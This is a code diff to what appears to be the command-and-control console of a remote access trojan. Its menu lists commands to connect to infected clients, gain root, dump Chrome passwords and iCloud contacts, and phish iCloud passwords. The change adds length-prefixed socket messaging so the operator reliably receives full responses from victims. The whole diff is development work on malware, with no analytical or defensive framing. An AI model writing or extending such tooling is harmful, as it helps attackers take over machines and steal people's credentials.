@@ -5,6 +5,7 @@ import ssl
 import thread
 import os
 import base64
+import struct
 
 BANNER = '''\
   ______       _  _   ____    _____ __   __
@@ -34,7 +35,7 @@ def print_help():
     print "clients           -  Show a list of clients."
     print "connect <ID>      -  Connect to the client."
     print "get_info          -  Show basic information about the client."
-    print "get_root          -  Attempt to get root via exploits."
+    print "get_root          -  Attempt to get root via local privilege escalation."
     print "chrome_passwords  -  Retrieve Chrome passwords."
     print "icloud_contacts   -  Retrieve iCloud contacts."
     print "icloud_phish      -  Attempt to get iCloud password via phishing."
@@ -61,12 +62,44 @@ def print_clients():
                 print "    {0} = {1}".format(str(client_id), computer_name)
 
 
+def send_message(connection, message):
+    # Prefix each message with a 4-byte length (network byte order)
+    prefixed_message = struct.pack('>I', len(message)) + message
+
+    connection.sendall(prefixed_message)
+
+
+def receive_message(connection):
+    # Read message length and unpack it into an integer
+    message_length = receive_all(connection, 4)
+
+    if not message_length:
+        return None
+
+    msglen = struct.unpack('>I', message_length)[0]
+
+    # Read the message data
+    return receive_all(connection, msglen)
+
+
+def receive_all(connection, message_length):
+    """Helper function to receive message_length bytes or return None if EOF is hit."""
+    data = ''
+    while len(data) < message_length:
+        packet = connection.recv(message_length - len(data))
+        if not packet:
+            return None
+        data += packet
+    return data
+
+
 def send_command(connection, message):
+    """Sends a command to the connection and returns the response."""
     try:
-        connection.sendall(message)
+        send_message(connection, message)
         global current_client_id
 
-        response = connection.recv(4096)
+        response = receive_message(connection)
 
         if not response:  # Empty
             current_client_id = None
